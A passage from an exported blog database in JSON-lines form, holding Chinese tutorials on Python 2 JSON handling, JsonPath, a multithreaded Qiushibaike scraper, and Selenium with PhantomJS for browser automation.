4]'\n\n# 注意：json.dumps() 序列化时默认使用的ascii编码\n# 添加参数 ensure_ascii=False 禁用ascii编码，按utf-8编码\n# chardet.detect()返回字典, 其中confidence是检测精确度\n\njson.dumps(dictStr) \n# '{\"city\": \"\\\\u5317\\\\u4eac\", \"name\": \"\\\\u5927\\\\u5218\"}'\n\nchardet.detect(json.dumps(dictStr))\n# {'confidence': 1.0, 'encoding': 'ascii'}\n\nprint json.dumps(dictStr, ensure_ascii=False) \n# {\"city\": \"北京\", \"name\": \"大刘\"}\n\nchardet.detect(json.dumps(dictStr, ensure_ascii=False))\n# {'confidence': 0.99, 'encoding': 'utf-8'}\n</code></pre>\n\n<p><strong><em>chardet是一个非常优秀的编码识别模块，可通过pip安装</em></strong></p>\n\n<h2 id=\"3-jsondump\">3. json.dump()</h2>\n\n<p>将Python内置类型序列化为json对象后写入文件</p>\n\n<pre class=\"has\">\n<code># json_dump.py\n\nimport json\n\nlistStr = [{\"city\": \"北京\"}, {\"name\": \"大刘\"}]\njson.dump(listStr, open(\"listStr.json\",\"w\"), ensure_ascii=False)\n\ndictStr = {\"city\": \"北京\", \"name\": \"大刘\"}\njson.dump(dictStr, open(\"dictStr.json\",\"w\"), ensure_ascii=False)\n</code></pre>\n\n<h2 id=\"4-jsonload\">4. json.load()</h2>\n\n<p>读取文件中json形式的字符串元素 转化成python类型</p>\n\n<pre class=\"has\">\n<code># json_load.py\n\nimport json\n\nstrList = json.load(open(\"listStr.json\"))\nprint strList\n\n# [{u'city': u'\\u5317\\u4eac'}, {u'name': u'\\u5927\\u5218'}]\n\nstrDict = json.load(open(\"dictStr.json\"))\nprint strDict\n# {u'city': u'\\u5317\\u4eac', u'name': u'\\u5927\\u5218'}\n</code></pre>\n\n<h1 id=\"jsonpath\">JsonPath</h1>\n\n<p>JsonPath 是一种信息抽取类库，是从JSON文档中抽取指定信息的工具，提供多种语言实现版本，包括：Javascript, Python， PHP 和 Java。</p>\n\n<p>JsonPath 对于 JSON 来说，相当于 XPATH 对于 XML。</p>\n\n<blockquote>\n<p>下载地址：<a href=\"https://pypi.python.org/pypi/jsonpath/\" rel=\"nofollow\">https://pypi.python.org/pypi/jsonpath</a></p>\n\n<p>安装方法：点击<code>Download URL</code>链接下载jsonpath，解压之后执行<code>python setup.py install</code></p>\n\n<p>官方文档：<a href=\"http://goessner.net/articles/JsonPath/\" rel=\"nofollow\">http://goessner.net/articles/JsonPath</a></p>\n</blockquote>\n\n<h2 id=\"jsonpath与xpath语法对比：\">JsonPath与XPath语法对比：</h2>\n\n<p>Json结构清晰，可读性高，复杂度低，非常容易匹配，下表中对应了XPath的用法。</p>\n\n<table><thead><tr><th>XPath</th>\n\t\t\t<th>JSONPath</th>\n\t\t\t<th>描述</th>\n\t\t</tr></thead><tbody><tr><td><code>/</code></td>\n\t\t\t<td><code>$</code></td>\n\t\t\t<td>根节点</td>\n\t\t</tr><tr><td><code>.</code></td>\n\t\t\t<td><code>@</code></td>\n\t\t\t<td>现行节点</td>\n\t\t</tr><tr><td><code>/</code></td>\n\t\t\t<td><code>.</code>or<code>[]</code></td>\n\t\t\t<td>取子节点</td>\n\t\t</tr><tr><td><code>..</code></td>\n\t\t\t<td>n/a</td>\n\t\t\t<td>取父节点，Jsonpath未支持</td>\n\t\t</tr><tr><td><code>//</code></td>\n\t\t\t<td><code>..</code></td>\n\t\t\t<td>就是不管位置，选择所有符合条件的条件</td>\n\t\t</tr><tr><td><code>*</code></td>\n\t\t\t<td><code>*</code></td>\n\t\t\t<td>匹配所有元素节点</td>\n\t\t</tr><tr><td><code>@</code></td>\n\t\t\t<td>n/a</td>\n\t\t\t<td>根据属性访问，Json不支持，因为Json是个Key-value递归结构，不需要。</td>\n\t\t</tr><tr><td><code>[]</code></td>\n\t\t\t<td><code>[]</code></td>\n\t\t\t<td>迭代器标示（可以在里边做简单的迭代操作，如数组下标，根据内容选值等）</td>\n\t\t</tr><tr><td>|</td>\n\t\t\t<td><code>[,]</code></td>\n\t\t\t<td>支持迭代器中做多选。</td>\n\t\t</tr><tr><td><code>[]</code></td>\n\t\t\t<td><code>?()</code></td>\n\t\t\t<td>支持过滤操作.</td>\n\t\t</tr><tr><td>n/a</td>\n\t\t\t<td><code>()</code></td>\n\t\t\t<td>支持表达式计算</td>\n\t\t</tr><tr><td><code>()</code></td>\n\t\t\t<td>n/a</td>\n\t\t\t<td>分组，JsonPath不支持</td>\n\t\t</tr></tbody></table><h2 id=\"示例：\">示例：</h2>\n\n<p>我们以拉勾网城市JSON文件 <a href=\"http://www.lagou.com/lbs/getAllCitySearchLabels.json\" rel=\"nofollow\">http://www.lagou.com/lbs/getAllCitySearchLabels.json</a> 为例，获取所有城市。</p>\n\n<pre class=\"has\">\n<code># jsonpath_lagou.py\n\nimport urllib2\nimport jsonpath\nimport json\nimport chardet\n\nurl = 'http://www.lagou.com/lbs/getAllCitySearchLabels.json'\nrequest =urllib2.Request(url)\nresponse = urllib2.urlopen(request)\nhtml = response.read()\n\n# 把json格式字符串转换成python对象\njsonobj = json.loads(html)\n\n# 从根节点开始，匹配name节点\ncitylist = jsonpath.jsonpath(jsonobj,'$..name')\n\nprint citylist\nprint type(citylist)\nfp = open('city.json','w')\n\ncontent = json.dumps(citylist, ensure_ascii=False)\nprint content\n\nfp.write(content.encode('utf-8'))\nfp.close()\n</code></pre>\n\n<h2 id=\"注意事项：\">注意事项：</h2>\n\n<p>json.loads() 是把 Json格式字符串解码转换成Python对象，如果在json.loads的时候出错，要注意被解码的Json字符的编码。</p>\n\n<p>如果传入的字符串的编码不是UTF-8的话，需要指定字符编码的参数 <code>encoding</code></p>\n\n<pre class=\"has\">\n<code>dataDict = json.loads(jsonStrGBK);\n</code></pre>\n\n<ul><li>\n\t<p>dataJsonStr是JSON字符串，假设其编码本身是非UTF-8的话而是GBK 的，那么上述代码会导致出错，改为对应的：</p>\n\n\t<pre class=\"has\">\n<code>  dataDict = json.loads(jsonStrGBK, encoding=\"GBK\");\n</code></pre>\n\t</li>\n\t<li>\n\t<p>如果 dataJsonStr通过encoding指定了合适的编码，但是其中又包含了其他编码的字符，则需要先去将dataJsonStr转换为Unicode，然后再指定编码格式调用json.loads()</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>``` python\n</code></pre>\n\n<p>dataJsonStrUni = dataJsonStr.decode(\"GB2312\"); dataDict = json.loads(dataJsonStrUni, encoding=\"GB2312\");</p>\n\n<pre class=\"has\">\n<code>\n##字符串编码转换\n\n这是中国程序员最苦逼的地方，什么乱码之类的几乎都是由汉字引起的。\n其实编码问题很好搞定，只要记住一点：\n\n####任何平台的任何编码 都能和 Unicode 互相转换\n\nUTF-8 与 GBK 互相转换，那就先把UTF-8转换成Unicode，再从Unicode转换成GBK，反之同理。\n\n\n\n``` python \n# 这是一个 UTF-8 编码的字符串\nutf8Str = \"你好地球\"\n\n# 1. 将 UTF-8 编码的字符串 转换成 Unicode 编码\nunicodeStr = utf8Str.decode(\"UTF-8\")\n\n# 2. 再将 Unicode 编码格式字符串 转换成 GBK 编码\ngbkData = unicodeStr.encode(\"GBK\")\n\n# 1. 再将 GBK 编码格式字符串 转化成 Unicode\nunicodeStr = gbkData.decode(\"gbk\")\n\n# 2. 再将 Unicode 编码格式字符串转换成 UTF-8\nutf8Str = unicodeStr.encode(\"UTF-8\")\n</code></pre>\n\n<p><code>decode</code>的作用是将其他编码的字符串转换成 Unicode 编码</p>\n\n<p><code>encode</code>的作用是将 Unicode 编码转换成其他编码的字符串</p>\n\n<p><code>一句话：UTF-8是对Unicode字符集进行编码的一种编码方式</code></p>\n                                    </div>", "log_PostTime": 1584891214, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python爬虫实战糗事百科实例", "log_Intro": "Python爬虫实战糗事百科实例", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>爬取糗事百科段子，假设页面的URL是 <a href=\"http://www.qiushibaike.com/8hr/page/1\" rel=\"nofollow\">http://www.qiushibaike.com/8hr/page/1</a></p>\n\n<h3 id=\"要求：\">要求：</h3>\n\n<ol><li>\n\t<p>使用requests获取页面信息，用XPath / re 做数据提取</p>\n\t</li>\n\t<li>\n\t<p>获取每个帖子里的<code>用户头像链接</code>、<code>用户姓名</code>、<code>段子内容</code>、<code>点赞次数</code>和<code>评论次数</code></p>\n\t</li>\n\t<li>\n\t<p>保存到 json 文件内</p>\n\t</li>\n</ol><h2 id=\"参考代码\">参考代码</h2>\n\n<pre class=\"has\">\n<code>#qiushibaike.py\n\n#import urllib\n#import re\n#import chardet\n\nimport requests\nfrom lxml import etree\n\npage = 1\nurl = 'http://www.qiushibaike.com/8hr/page/' + str(page) \nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',\n    'Accept-Language': 'zh-CN,zh;q=0.8'}\n\ntry:\n    response = requests.get(url, headers=headers)\n    resHtml = response.text\n\n    html = etree.HTML(resHtml)\n    result = html.xpath('//div[contains(@id,\"qiushi_tag\")]')\n\n    for site in result:\n        item = {}\n\n        imgUrl = site.xpath('./div/a/img/@src')[0].encode('utf-8')\n        username = site.xpath('./div/a/@title')[0].encode('utf-8')\n        #username = site.xpath('.//h2')[0].text\n        content = site.xpath('.//div[@class=\"content\"]/span')[0].text.strip().encode('utf-8')\n        # 投票次数\n        vote = site.xpath('.//i')[0].text\n        #print site.xpath('.//*[@class=\"number\"]')[0].text\n        # 评论信息\n        comments = site.xpath('.//i')[1].text\n\n        print imgUrl, username, content, vote, comments\n\nexcept Exception, e:\n    print e\n</code></pre>\n\n<h2 id=\"演示效果\">演示效果</h2>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191029174434107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<h1 id=\"多线程糗事百科案例\">多线程糗事百科案例</h1>\n\n<p>案例要求参考上面糗事百科单进程案例</p>\n\n<h3 id=\"queue（队列对象）\">Queue（队列对象）</h3>\n\n<p>Queue是python中的标准库，可以直接import Queue引用;队列是线程间最常用的交换数据的形式</p>\n\n<p>python下多线程的思考</p>\n\n<p>对于资源，加锁是个重要的环节。因为python原生的list,dict等，都是not thread safe的。而Queue，是线程安全的，因此在满足使用条件下，建议使用队列</p>\n\n<ol><li>\n\t<p>初始化： class Queue.Queue(maxsize) FIFO 先进先出</p>\n\t</li>\n\t<li>\n\t<p>包中的常用方法:</p>\n\n\t<ul><li>\n\t\t<p>Queue.qsize() 返回队列的大小</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Queue.empty() 如果队列为空，返回True,反之False</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Queue.full() 如果队列满了，返回True,反之False</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Queue.full 与 maxsize 大小对应</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Queue.get([block[, timeout]])获取队列，timeout等待时间</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>创建一个“队列”对象</p>\n\n\t<ul><li>import Queue</li>\n\t\t<li>myqueue = Queue.Queue(maxsize = 10)</li>\n\t</ul></li>\n\t<li>\n\t<p>将一个值放入队列中</p>\n\n\t<ul><li>myqueue.put(10)</li>\n\t</ul></li>\n\t<li>\n\t<p>将一个值从队列中取出</p>\n\n\t<ul><li>myqueue.get()</li>\n\t</ul></li>\n</ol><h3 id=\"多线程示意图\">多线程示意图</h3>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191029174542560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\nimport requests\nfrom lxml import etree\nfrom Queue import Queue\nimport threading\nimport time\nimport json\n\n\nclass thread_crawl(threading.Thread):\n    '''\n    抓取线程类\n    '''\n\n    def __init__(self, threadID, q):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.q = q\n\n    def run(self):\n        print \"Starting \" + self.threadID\n        self.qiushi_spider()\n        print \"Exiting \", self.threadID\n\n    def qiushi_spider(self):\n        # page = 1\n        while True:\n            if self.q.empty():\n                break\n            else:\n                page = self.q.get()\n                print 'qiushi_spider=', self.threadID, ',page=', str(page)\n                url = 'http://www.qiushibaike.com/8hr/page/' + str(page) + '/'\n                headers = {\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',\n                    'Accept-Language': 'zh-CN,zh;q=0.8'}\n                # 多次尝试失败结束、防止死循环\n                timeout = 4\n                while timeout &gt; 0:\n                    timeout -= 1\n                    try:\n                        content = requests.get(url, headers=headers)\n                        data_queue.put(content.text)\n                        break\n                    except Exception, e:\n                        print 'qiushi_spider', e\n                if timeout &lt; 0:\n                    print 'timeout', url\n\n\nclass Thread_Parser(threading.Thread):\n    '''\n    页面解析类；\n    '''\n\n    def __init__(self, threadID, queue, lock, f):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.queue = queue\n        self.lock = lock\n        self.f = f\n\n    def run(self):\n        print 'starting ', self.threadID\n        global total, exitFlag_Parser\n        while not exitFlag_Parser:\n            try:\n                '''\n                调用队列对象的get()方法从队头删除并返回一个项目。可选参数为block，默认为True。\n                如果队列为空且block为True，get()就使调用线程暂停，直至有项目可用。\n                如果队列为空且block为False，队列将引发Empty异常。\n                '''\n                item = self.queue.get(False)\n                if not item:\n                    pass\n                self.parse_data(item)\n                self.queue.task_done()\n                print 'Thread_Parser=', self.threadID, ',total=', total\n            except:\n                pass\n        print 'Exiting ', self.threadID\n\n    def parse_data(self, item):\n        '''\n        解析网页函数\n        :param item: 网页内容\n        :return:\n        '''\n        global total\n        try:\n            html = etree.HTML(item)\n            result = html.xpath('//div[contains(@id,\"qiushi_tag\")]')\n            for site in result:\n                try:\n                    imgUrl = site.xpath('.//img/@src')[0]\n                    title = site.xpath('.//h2')[0].text\n                    content = site.xpath('.//div[@class=\"content\"]/span')[0].text.strip()\n                    vote = None\n                    comments = None\n                    try:\n                        vote = site.xpath('.//i')[0].text\n                        comments = site.xpath('.//i')[1].text\n                    except:\n                        pass\n                    result = {\n                        'imgUrl': imgUrl,\n                        'title': title,\n                        'content': content,\n                        'vote': vote,\n                        'comments': comments,\n                    }\n\n                    with self.lock:\n                        # print 'write %s' % json.dumps(result)\n                        self.f.write(json.dumps(result, ensure_ascii=False).encode('utf-8') + \"\\n\")\n\n                except Exception, e:\n                    print 'site in result', e\n        except Exception, e:\n            print 'parse_data', e\n        with self.lock:\n            total += 1\n\ndata_queue = Queue()\nexitFlag_Parser = False\nlock = threading.Lock()\ntotal = 0\n\ndef main():\n    output = open('qiushibaike.json', 'a')\n\n    #初始化网页页码page从1-10个页面\n    pageQueue = Queue(50)\n    for page in range(1, 11):\n        pageQueue.put(page)\n\n    #初始化采集线程\n    crawlthreads = []\n    crawlList = [\"crawl-1\", \"crawl-2\", \"crawl-3\"]\n\n    for threadID in crawlList:\n        thread = thread_crawl(threadID, pageQueue)\n        thread.start()\n        crawlthreads.append(thread)\n\n    #初始化解析线程parserList\n    parserthreads = []\n    parserList = [\"parser-1\", \"parser-2\", \"parser-3\"]\n    #分别启动parserList\n    for threadID in parserList:\n        thread = Thread_Parser(threadID, data_queue, lock, output)\n        thread.start()\n        parserthreads.append(thread)\n\n    # 等待队列清空\n    while not pageQueue.empty():\n        pass\n\n    # 等待所有线程完成\n    for t in crawlthreads:\n        t.join()\n\n    while not data_queue.empty():\n        pass\n    # 通知线程是时候退出\n    global exitFlag_Parser\n    exitFlag_Parser = True\n\n    for t in parserthreads:\n        t.join()\n    print \"Exiting Main Thread\"\n    with lock:\n        output.close()\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019102917461620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891216, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Selenium和PhantomJS", "log_Intro": "Python:Selenium和PhantomJS", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"selenium\">Selenium</h2>\n\n<p><a href=\"http://www.seleniumhq.org/\" rel=\"nofollow\">Selenium</a>是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动操作，不同是Selenium 可以直接运行在浏览器上，它支持所有主流的浏览器（包括PhantomJS这些无界面的浏览器）。</p>\n\n<p>Selenium 可以根据我们的指令，让浏览器自动加载页面，获取需要的数据，甚至页面截屏，或者判断网站上某些动作是否发生。</p>\n\n<p>Selenium 自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。但是我们有时候需要让它内嵌在代码中运行，所以我们可以用一个叫 PhantomJS 的工具代替真实的浏览器。</p>\n\n<blockquote>\n<p>可以从 PyPI 网站下载 Selenium库<a href=\"https://pypi.python.org/simple/selenium/\" rel=\"nofollow\">https://pypi.python.org/simple/selenium</a> ，也可以用 第三方管理器 pip用命令安装：<code>pip install selenium</code></p>\n\n<p>Selenium 官方参考文档：<a href=\"http://selenium-python.readthedocs.io/index.html\" rel=\"nofollow\">http://selenium-python.readthedocs.io/index.html</a></p>\n</blockquote>\n\n<h2 id=\"phantomjs\">PhantomJS</h2>\n\n<p><a href=\"http://phantomjs.org\" rel=\"nofollow\">PhantomJS</a> 是一个基于Webkit的“无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的 JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器要高效。</p>\n\n<p>如果我们把 Selenium 和 PhantomJS 结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理 JavaScrip、Cookie、headers，以及任何我们真实用户需要做的事情。</p>\n\n<blockquote>\n<p>注意：PhantomJS 只能从它的官方网站<a href=\"http://phantomjs.org/download.html\" rel=\"nofollow\">http://phantomjs.org/download.html)</a> 下载。 因为 PhantomJS 是一个功能完善(虽然无界面)的浏览器而非一个 Python 库，所以它不需要像 Python 的其他库一样安装，但我们可以通过Selenium调用PhantomJS来直接使用。</p>\n\n<p>PhantomJS 官方参考文档：<a href=\"http://phantomjs.org/documentation/\" rel=\"nofollow\">http://phantomjs.org/documentation</a></p>\n</blockquote>\n\n<h2 id=\"快速入门\">快速入门</h2>\n\n<p>Selenium 库里有个叫 WebDriver 的 API。WebDriver 有点儿像可以加载网站的浏览器，但是它也可以像 BeautifulSoup 或者其他 Selector 对象一样用来查找页面元素，与页面上的元素进行交互 (发送文本、点击等)，以及执行其他动作来运行网络爬虫。</p>\n\n<pre class=\"has\">\n<code># IPython2 测试代码\n\n# 导入 webdriver\nfrom selenium import webdriver\n\n# 要想调用键盘按键操作需要引入keys包\nfrom selenium.webdriver.common.keys import Keys\n\n# 调用环境变量指定的PhantomJS浏览器创建浏览器对象\ndriver = webdriver.PhantomJS()\n\n# 如果没有在环境变量指定PhantomJS位置\n# driver = webdriver.PhantomJS(executable_path=\"./phantomjs\"))\n\n# get方法会一直等到页面被完全加载，然后才会继续程序，通常测试会在这里选择 time.sleep(2)\ndriver.get(\"http://www.baidu.com/\")\n\n# 获取页面名为 wrapper的id标签的文本内容\ndata = driver.find_element_by_id(\"wrapper\").text\n\n# 打印数据内容\nprint data\n\n# 打印页面标题 \"百度一下，你就知道\"\nprint driver.title\n\n# 生成当前页面快照并保存\ndriver.save_screenshot(\"baidu.png\")\n\n# id=\"kw\"是百度搜索输入框，输入字符串\"长城\"\ndriver.find_element_by_id(\"kw\").send_keys(u\"长城\")\n\n# id=\"su\"是百度搜索按钮，click() 是模拟点击\ndriver.find_element_by_id(\"su\").click()\n\n# 获取新的页面快照\ndriver.save_screenshot(\"长城.png\")\n\n# 打印网页渲染后的源代码\nprint driver.page_source\n\n# 获取当前页面Cookie\nprint driver.get_cookies()\n\n# ctrl+a 全选输入框内容\ndriver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,'a')\n\n# ctrl+x 剪切输入框内容\ndriver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,'x')\n\n# 输入框重新输入内容\ndriver.find_element_by_id(\"kw\").send_keys(\"itcast\")\n\n# 模拟Enter回车键\ndriver.find_element_by_id(\"su\").send_keys(Keys.RETURN)\n\n# 清除输入框内容\ndriver.find_element_by_id(\"kw\").clear()\n\n# 生成新的页面快照\ndriver.save_screenshot(\"itcast.png\")\n\n# 获取当前url\nprint driver.current_url\n\n# 关闭当前页面，如果只有一个页面，会关闭浏览器\n# driver.close()\n\n# 关闭浏览器\ndriver.quit()\n</code></pre>\n\n<h2 id=\"页面操作\">页面操作</h2>\n\n<p>Selenium 的 WebDriver提供了各种方法来寻找元素，假设下面有一个表单输入框：</p>\n\n<pre class=\"has\">\n<code>&lt;input type=\"text\" name=\"user-name\" id=\"passwd-id\" /&gt;\n</code></pre>\n\n<p>那么：</p>\n\n<pre class=\"has\">\n<code># 获取id标签值\nelement = driver.find_element_by_id(\"passwd-id\")\n# 获取name标签值\nelement = driver.find_element_by_name(\"user-name\")\n# 获取标签名值\nelement = driver.find_elements_by_tag_name(\"input\")\n# 也可以通过XPath来匹配\nelement = driver.find_element_by_xpath(\"//input[@id='passwd-id']\")\n</code></pre>\n\n<h3 id=\"定位ui元素-webelements\">定位UI元素 (WebElements)</h3>\n\n<p>关于元素的选取，有如下的API 单个元素选取</p>\n\n<pre class=\"has\">\n<code>find_element_by_id\nfind_elements_by_name\nfind_elements_by_xpath\nfind_elements_by_link_text\nfind_elements_by_partial_link_text\nfind_elements_by_tag_name\nfind_elements_by_class_name\nfind_elements_by_css_selector\n</code></pre>\n\n<ol><li>\n\t<p>By ID</p>\n\n\t<pre class=\"has\">\n<code>&lt;div id=\"coolestWidgetEvah\"&gt;...&lt;/div&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>element = driver.find_element_by_id(\"coolestWidgetEvah\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\nelement = driver.find_element(by=By.ID, value=\"coolestWidgetEvah\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n</ol><ol><li>\n\t<p>By Class Name</p>\n\n\t<pre class=\"has\">\n<code>&lt;div class=\"cheese\"&gt;&lt;span&gt;Cheddar&lt;/span&gt;&lt;/div&gt;&lt;div class=\"cheese\"&gt;&lt;span&gt;Gouda&lt;/span&gt;&lt;/div&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>cheeses = driver.find_elements_by_class_name(\"cheese\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ncheeses = driver.find_elements(By.CLASS_NAME, \"cheese\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By Tag Name</p>\n\n\t<pre class=\"has\">\n<code>&lt;iframe src=\"...\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>frame = driver.find_element_by_tag_name(\"iframe\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\nframe = driver.find_element(By.TAG_NAME, \"iframe\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By Name</p>\n\n\t<pre class=\"has\">\n<code>&lt;input name=\"cheese\" type=\"text\"/&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>cheese = driver.find_element_by_name(\"cheese\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ncheese = driver.find_element(By.NAME, \"cheese\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By Link Text</p>\n\n\t<pre class=\"has\">\n<code>&lt;a href=\"http://www.google.com/search?q=cheese\"&gt;cheese&lt;/a&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>cheese = driver.find_element_by_link_text(\"cheese\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ncheese = driver.find_element(By.LINK_TEXT, \"cheese\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By Partial Link Text</p>\n\n\t<pre class=\"has\">\n<code>&lt;a href=\"http://www.google.com/search?q=cheese\"&gt;search for cheese&lt;/a&gt;&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>cheese = driver.find_element_by_partial_link_text(\"cheese\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ncheese = driver.find_element(By.PARTIAL_LINK_TEXT, \"cheese\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By CSS</p>\n\n\t<pre class=\"has\">\n<code>&lt;div id=\"food\"&gt;&lt;span class=\"dairy\"&gt;milk&lt;/span&gt;&lt;span class=\"dairy aged\"&gt;cheese&lt;/span&gt;&lt;/div&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>cheese = driver.find_element_by_css_selector(\"#food span.dairy.aged\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ncheese = driver.find_element(By.CSS_SELECTOR, \"#food span.dairy.aged\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>By XPath</p>\n\n\t<pre class=\"has\">\n<code>&lt;input type=\"text\" name=\"example\" /&gt;\n&lt;INPUT type=\"text\" name=\"other\" /&gt;\n</code></pre>\n\n\t<ul><li>\n\t\t<p>实现</p>\n\n\t\t<pre class=\"has\">\n<code>inputs = driver.find_elements_by_xpath(\"//input\")\n------------------------ or -------------------------\nfrom selenium.webdriver.common.by import By\ninputs = driver.find_elements(By.XPATH, \"//input\")\n</code></pre>\n\t\t</li>\n\t</ul></li>\n</ol><h2 id=\"鼠标动作链\">鼠标动作链</h2>\n\n<p>有些时候，我们需要再页面上模拟一些鼠标操作，比如双击、右击、拖拽甚至按住不动等，我们可以通过导入 ActionChains 类来做到：</p>\n\n<p>示例：</p>\n\n<pre class=\"has\">\n<code>\n#导入 ActionChains 类\nfrom selenium.webdriver import ActionChains\n\n# 鼠标移动到 ac 位置\nac = driver.find_element_by_xpath('element')\nActionChains(driver).move_to_element(ac).perform()\n\n\n# 在 ac 位置单击\nac = driver.find_element_by_xpath(\"elementA\")\nActionChains(driver).move_to_element(ac).click(ac).perform()\n\n# 在 ac 位置双击\nac = driver.find_element_by_xpath(\"elementB\")\nActionChains(driver).move_to_element(ac).double_click(ac).perform()\n\n# 在 ac 位置右击\nac = driver.find_element_by_xpath(\"elementC\")\nActionChains(driver).move_to_element(ac).context_click(ac).perform()\n\n# 在 ac 位置左键单击hold住\nac = driver.find_element_by_xpath('elementF')\nActionChains(driver).move_to_element(ac).click_and_hold(ac).perform()\n\n# 将 ac1 拖拽到 ac2 位置\nac1 = driver.find_element_by_xpath('elementD')\nac2 = driver.find_element_by_xpath('elementE')\nActionChains(driver).drag_and_drop(ac1, ac2).perform()\n</code></pre>\n\n<h2 id=\"填充表单\">填充表单</h2>\n\n<p>我们已经知道了怎样向文本框中输入文字，但是有时候我们会碰到<code>&lt;select&gt; &lt;/select&gt;</code>标签的下拉框。直接点击下拉框中的选项不一定可行。</p>\n\n<pre class=\"has\">\n<code>&lt;select id=\"status\" class=\"form-control valid\" onchange=\"\" name=\"status\"&gt;\n    &lt;option value=\"\"&gt;&lt;/option&gt;\n    &lt;option value=\"0\"&gt;未审核&lt;/option&gt;\n    &lt;option value=\"1\"&gt;初审通过&lt;/option&gt;\n    &lt;option value=\"2\"&gt;复审通过&lt;/option&gt;\n    &lt;option value=\"3\"&gt;审核不通过&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191029180113505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>Selenium专门提供了Select类来处理下拉框。 其实 WebDriver 中提供了一个叫 Select 的方法，可以帮助我们完成这些事情：</p>\n\n<pre class=\"has\">\n<code># 导入 Select 类\nfrom selenium.webdriver.support.ui import Select\n\n# 找到 name 的选项卡\nselect = Select(driver.find_element_by_name('status'))\n\n# \nselect.select_by_index(1)\nselect.select_by_value(\"0\")\nselect.select_by_visible_text(u\"未审核\")\n</code></pre>\n\n<p>以上是三种选择下拉框的方式，它可以根据索引来选择，可以根据值来选择，可以根据文字来选择。注意：</p>\n\n<blockquote>\n<ul><li>index 索引从 0 